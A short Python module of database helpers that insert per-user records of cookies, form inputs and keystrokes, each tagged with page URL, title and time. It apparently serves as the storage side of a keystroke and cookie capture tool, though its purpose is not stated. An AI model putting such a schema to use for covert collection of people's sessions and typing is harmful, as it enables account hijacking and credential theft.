import sys
import psycopg2
import re


def db_newUser(cur):
    qry = """
    INSERT INTO Users VALUES (DEFAULT) RETURNING id;
    """
    cur.execute(qry,[])
    return cur.fetchone()

def db_addCookies(cur,id,url,title,content):
    qry = """INSERT INTO Cookies VALUES (%s,NOW(),%s,%s,%s);"""
    cur.execute(qry,[id,url,title,content])

def db_addInput(cur,id,url,title,type,content):
    qry = """INSERT INTO Inputs VALUES (%s,NOW(),%s,%s,%s,%s);"""
    cur.execute(qry,[id,url,title,type,content])

def db_addKeystrokes(cur,id,url,title,content):
    qry = """INSERT INTO Keystrokes VALUES (%s,NOW(),%s,%s,%s);"""
    cur.execute(qry,[id,url,title,content])